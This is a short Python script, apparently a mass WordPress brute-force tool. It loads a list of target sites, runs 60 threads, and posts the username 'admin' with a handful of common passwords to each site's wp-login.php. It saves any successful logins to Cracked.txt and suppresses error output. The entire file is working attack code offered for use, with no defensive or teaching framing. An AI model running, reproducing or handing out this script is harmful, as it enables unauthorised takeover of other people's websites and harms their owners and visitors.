import os
import random
import sys
import time
import urllib.parse
import urllib.request
from multiprocessing.dummy import Pool
import click

sys.stderr = open(os.devnull, 'w')

class wpbrutex:
    def __init__(self):
        clear = "\x1b[0m"
        colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
        x = """

 __      _____   ___ ___ _   _ _____ ___ ___ ___  ___  ___ ___ 
 \ \    / / _ \ | _ ) _ \ | | |_   _| __| __/ _ \| _ \/ __| __|
  \ \/\/ /|  _/ | _ \   / |_| | | | | _|| _| (_) |   / (__| _| 
   \_/\_/ |_|   |___/_|_\\___/_ |_| |___|_| \___/|_|_\\___|___|
  / __ \ _____ ___ __| |___(_) |_ ___ __| |___| |_ __ ___      
 / / _` / -_) \ / '_ \ / _ \ |  _(_-</ _` / _ \  _/ _(_-<      
 \ \__,_\___/_\_\ .__/_\___/_|\__/__/\__,_\___/\__\__/__/      
  \____/        |_|                                            
                    
    """
        try:
            for N, line in enumerate(x.split("\n")):
                click.echo(click.style(line, fg=random.choice(colors)))
                time.sleep(0.05)
        except Exception as e:
            pass 
        
        list_input = input('List of Sites : ')
        urls = open(list_input, 'r').readlines()
        urls = [u.strip() for u in urls]  
        ThreadPool = Pool(60)
        ThreadPool.map(self.wpbrute, urls)

    def wpbrute(self, url):
        try:
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "http://" + url 

            user = "admin"
            passlist = ["admin", "adminadmin", "pass", "admin@123", "pass@123"]
            for password in passlist:
                password = password.strip()
                try:
                    cj = urllib.request.HTTPCookieProcessor()
                    opener = urllib.request.build_opener(cj)
                    urllib.request.install_opener(opener)
                    login_data = urllib.parse.urlencode({'log': user, 'pwd': password}).encode('utf-8')
                    response = urllib.request.urlopen(url + '/wp-login.php', login_data, timeout=10) #timeout you can change more faster 8-15 only
                    resp = response.read().decode('utf-8')
                    if '<li id="wp-admin-bar-logout">' in resp:
                        click.echo("-----------------------------------------Wordpress-----------------------------------------")
                        click.secho("[+] Cracked Success Wp--> {}|{}|{}".format(url + '/wp-login.php', user, password), fg='green')
                        click.echo("------------------------------------------------------------------------------------------------")
                        with open('Cracked.txt', 'a') as myfile:
                            myfile.write("{}wp-login.php |{}|{} [#]Wordpress\n".format(url, user, password))
                        break
                    else:
                        click.secho("[-] Failed  Wordpress --> {}|admin|{}".format(url, password), fg='red')
                except Exception as e:
                    pass  
        except Exception as e:
            pass  

wpbrutex()
